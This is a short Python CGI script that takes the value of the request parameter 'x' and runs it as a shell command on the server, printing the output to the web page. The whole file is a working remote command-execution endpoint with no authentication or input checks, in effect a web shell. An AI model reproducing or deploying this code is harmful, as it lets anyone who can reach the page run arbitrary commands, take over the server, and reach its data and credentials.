#!/usr/bin/python3


print("content-type: text/html")
print()

import cgi
import subprocess as sb
#import time

f = cgi.FieldStorage()
cmd = f.getvalue("x")

#time.sleep(5)
output = sb.getstatusoutput(cmd)
if output[0] == 0 :
       print(output[1])
else:
       print("some Error :" +output[1])

